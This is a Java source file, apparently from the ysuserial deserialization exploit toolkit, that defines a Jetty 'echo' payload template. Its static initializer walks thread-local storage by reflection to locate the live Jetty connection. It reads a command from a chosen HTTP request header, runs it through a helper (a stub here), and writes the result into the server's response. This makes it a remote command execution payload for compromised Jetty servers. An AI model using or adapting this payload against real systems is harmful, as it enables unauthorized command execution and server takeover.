package org.su18.ysuserial.payloads.templates.echo;


/**
 * @author su18
 */
public class JettyEcho {

	public static String CMD_HEADER;

	static {
		try {
			Class                   clazz = Thread.currentThread().getClass();
			java.lang.reflect.Field field = clazz.getDeclaredField("threadLocals");
			field.setAccessible(true);
			Object obj = field.get(Thread.currentThread());

			field = obj.getClass().getDeclaredField("table");
			field.setAccessible(true);
			obj = field.get(obj);
			Object[] obj_arr = (Object[]) obj;
			for (int i = 0; i < obj_arr.length; i++) {
				Object o = obj_arr[i];
				if (o == null) continue;
				try {
					field = o.getClass().getDeclaredField("value");
					field.setAccessible(true);
					obj = field.get(o);
					if (obj.getClass().getName().endsWith("AsyncHttpConnection")) {
						Object                   connection = obj;
						java.lang.reflect.Method method     = connection.getClass().getMethod("getRequest", null);
						obj = method.invoke(connection, null);
						method = obj.getClass().getMethod("getHeader", new Class[]{String.class});
						String cmd = (String) method.invoke(obj, new Object[]{CMD_HEADER});
						if (cmd != null && !cmd.isEmpty()) {
							java.io.ByteArrayOutputStream baos = q(cmd);
							method = connection.getClass().getMethod("getPrintWriter", new Class[]{String.class});
							java.io.PrintWriter printWriter = (java.io.PrintWriter) method.invoke(connection, new Object[]{"utf-8"});
							printWriter.println(baos);
						}
						break;
					} else if (obj.getClass().getName().endsWith("HttpConnection")) {
						java.lang.reflect.Method method      = obj.getClass().getDeclaredMethod("getHttpChannel", null);
						Object                   httpChannel = method.invoke(obj, null);
						method = httpChannel.getClass().getMethod("getRequest", null);
						obj = method.invoke(httpChannel, null);
						method = obj.getClass().getMethod("getHeader", new Class[]{String.class});
						String cmd = (String) method.invoke(obj, new Object[]{CMD_HEADER});
						if (cmd != null && !cmd.isEmpty()) {
							java.io.ByteArrayOutputStream baos = q(cmd);
							method = httpChannel.getClass().getMethod("getResponse", null);

							obj = method.invoke(httpChannel, null);
							method = obj.getClass().getMethod("getWriter", null);
							java.io.PrintWriter printWriter = (java.io.PrintWriter) method.invoke(obj, null);
							printWriter.println(baos);
							printWriter.flush();
							printWriter.close();
						}
						break;
					}
				} catch (Exception ignored) {
				}
			}
		} catch (Exception ignored) {
		}
	}

	public static java.io.ByteArrayOutputStream q(String cmd) {
		return null;
	}
}
